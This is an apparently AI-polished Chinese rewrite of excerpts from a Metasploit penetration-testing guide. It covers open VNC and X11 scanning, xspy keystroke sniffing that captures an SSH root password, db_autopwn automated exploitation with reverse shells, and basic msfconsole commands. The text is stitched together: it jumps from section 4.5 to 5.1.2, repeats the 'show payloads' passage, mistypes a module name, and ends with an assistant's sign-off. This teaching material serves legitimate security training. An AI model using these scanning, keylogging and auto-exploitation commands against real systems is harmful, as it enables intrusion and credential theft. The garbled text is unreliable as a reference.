### 优化后的文本

#### 图4-18 使用 vncviewer 连接到未设置口令的 VNC 服务器
---

## 第81页
### Metasploit 渗透测试指南

想象一下，如果你认为进行一次 VNC 扫描是浪费时间，那么你将永远不会发现那些启用了开放 VNC 服务的系统。在一次针对上千个目标主机的大型渗透测试中，本书的一位作者注意到其中一个系统上运行着一个开放的 VNC 服务器。

当作者记录自己的发现时，他注意到有人正在操作这台主机。当时正值午夜，不太可能是合法用户在使用机器。于是，他假装成另一个未经授权的入侵者（这种做法并不总是明智的），通过记事本程序与该入侵者进行了对话。这位入侵者并没有戒心，相信了作者的话，并透露他正在扫描大量的 VNC 服务器。以下是这次对话的部分内容：

**作者**: 你在哪个国家？美国还是其他国家？我在丹麦有一些朋友。
**攻击者**: 我是挪威人，呵呵，在丹麦有几个亲戚。
**作者**: 你喜欢逛论坛吗？我以前喜欢的一些论坛都不在了。
**攻击者**: 我大部分时间都在编程论坛里混，其他不太感兴趣。你搞黑客很久了吗？顺便问一句，你多大了？我22岁。
**作者**: 我才做了一年左右，纯粹是个人兴趣。我还在上学，现在16岁。
**攻击者**: 我没上过学，我只是为了找点乐子，看看自己能做到什么程度，考验一下自己的技能。我写了一个“VNC 搜索器”，用它发现了许多 VNC 服务器，但这台最有意思。
**作者**: 哇，你太厉害了！你用什么语言写的？我能下载吗？你能帮我共享一下吗？
**攻击者**: 我用 PureBasic 写的，但还没打算公开，只是自己在用。不过我可以考虑给你共享一份。我把代码上传到某个地方，你自己下载编译。你需要去一些软件下载网站找到 PureBasic 的编译器。
**作者**: 太酷了。你可以把它传到 IRC 的 pastebin 网站上，那里可以匿名上传文件。我之前只用过 Python 和 Perl。
**攻击者**: 让我看看，我找一下你说的 pastebin 网站，然后把代码传上去。等我几分钟，我马上回来。

随后，这位攻击者给了作者一个包含其 VNC 扫描器完整源代码的 pastebin 网页链接。

### 4.4.3 扫描开放的 X11 服务器

Metasploit 的内置 `open_xll` 扫描器类似于 `vnc_auth` 扫描器，能够在大量主机中发现允许无身份验证连接的 X11 服务器。尽管 X11 服务器在新的操作系统上已不再广泛使用，但许多老旧主机仍在运行未打补丁的旧版本 X11 服务器。正如前面两个例子所示，老旧系统往往是网络中最脆弱的部分。

运行 `open_xll` 扫描器的过程与其他辅助模块类似，需要设置 `RHOSTS` 参数，并可选择性地修改 `THREADS` 值。扫描开始后会显示一段会话过程。请注意，扫描器在 IP 地址 `192.168.1.23` 处找到了一个开放的 X 服务器。这是一个严重的漏洞，因为它允许攻击者对系统进行未经授权的访问：X 系统处理包括鼠标和键盘支持在内的图形用户界面。

```plaintext
msf > use auxiliary/scanner/x11/open_x11
msf auxiliary(open_x11)> show options
Module options:
Name          Current Setting  Required  Description
RHOSTS                        yes       The target address range or CIDR identifier
RPORT        6000             yes       The target port
THREADS      1                yes       The number of concurrent threads

msf auxiliary(open_x11) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(open_x11)> set THREADS 50
THREADS => 50
msf auxiliary(open_x11)> run
[*] Trying 192.168.1.1
[*] Trying 192.168.1.0
[*] Trying 192.168.1.2...
[*] Trying 192.168.1.29
[*] Trying 192.168.1.30
[*] Open X Server @ 192.168.1.23 (The XFree86 Project, Inc)
[*] Trying 192.168.1.31
[*] Trying 192.168.1.32
[*] Trying 192.168.1.253
[*] Trying 192.168.1.254
[*] Trying 192.168.1.255
[*] Auxiliary module execution completed
```

让我们看看攻击者如何利用这个漏洞。现在使用 BackTrack 的 `xspy` 工具来记录目标的键盘输入，如下所示：

```plaintext
root@bt:/# cd /pentest/sniffers/xspy/
ssh PI:EMAIL(+BackSpace)37
sup3rs3cr3tp4s5w0rd
ifconfig
exit
```

`xspy` 工具能够远程嗅探 X 服务器的键盘操作，并记录下某个用户使用 SSH 以 root 身份登录另一远程系统的过程，其中包含了登录口令。这样的漏洞虽然罕见，但一旦发现，它们极具价值。

### 4.5 利用扫描结果进行自动化攻击

接下来，我们将简要介绍如何利用 Metasploit 的 Autopwn 工具自动选择目标并利用已开放端口或漏洞扫描结果进行自动化渗透攻击。你可以利用大多数漏洞扫描器（如 NeXpose、Nessus 和 OpenVAS）的结果来执行 Autopwn。

下面展示如何使用导入的 Nessus 扫描结果定位一个系统并对其进行自动化渗透攻击。使用 `db_connect` 命令创建一个新数据库，并使用 `db_import` 命令导入扫描报告。在示例中，我们运行 `db_autopwn` 命令，该命令包含一系列开关参数：对所有目标发起攻击（-e），显示所有匹配的模块（-t），使用反弹 shell 的攻击载荷（-r），根据漏洞选择攻击模块（-x），根据开放端口选择攻击模块（-p）。如果攻击成功，`db_autopwn` 命令将返回一个被攻击计算机的控制 shell。

```plaintext
msf > db_connect postgres:toor@127.0.0.1/msf3
msf> db_import /root/nessus.nbe
msf> db_autopwn -e -t -r -x -p
```

这个命令会显示 Metasploit 框架中所有可用的渗透攻击模块。在 MSF 终端中，你可以针对渗透测试中发现的安全漏洞实施相应的渗透攻击。Metasploit 团队不断开发新的渗透攻击模块，因此这个列表会越来越长。

### 5.1.2 显示辅助模块

```plaintext
msf > show auxiliary
```

这个命令会显示所有的辅助模块及其用途。在 Metasploit 中，辅助模块用途广泛，可以是扫描器、拒绝服务攻击工具、Fuzz 测试器等。

### 5.1.3 显示选项

```plaintext
msf > show options
```

参数（Options）是保证 Metasploit 框架中各个模块正确运行所需的各种设置。当你选择了一个模块并输入 `show options` 后，会列出这个模块所需的各种参数。如果没有选择任何模块，输入此命令将显示所有全局参数。例如，你可以修改全局参数中的 `LogLevel` 以使渗透攻击时的日志记录更详细。还可以使用 `back` 命令返回到 Metasploit 的上一个状态。

```plaintext
msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > back
msf >
```

### 5.1.4 显示攻击载荷

```plaintext
msf > show payloads
```

回想一下，在第2章中我们介绍了攻击载荷是针对特定平台的一段攻击代码，它将通过网络传播并在目标主机上执行。和 `show options` 命令一样，当你在当前模块的命令提示符下输入 `show payloads` 时，Metasploit 只会显示与当前模块兼容的攻击载荷。在基于 Windows 操作系统的攻击中，简单的攻击载荷可能只会返回目标主机的一个命令行界面，复杂的则能返回一个完整的图形操作界面。

```plaintext
msf > show payloads
```

上面的命令将显示 Metasploit 中所有的可用攻击载荷。然而，在实际的渗透攻击中，你可能只会看到适用于本次渗透攻击的攻击载荷列表。例如，在 `msf exploit(ms08_067_netapi)` 中，输入以下命令可以查看所有活动状态的攻击载荷：

```plaintext
msf > show payloads
```

希望这些优化后的文本更加清晰、连贯和专业。如果有进一步的需求，请随时告知。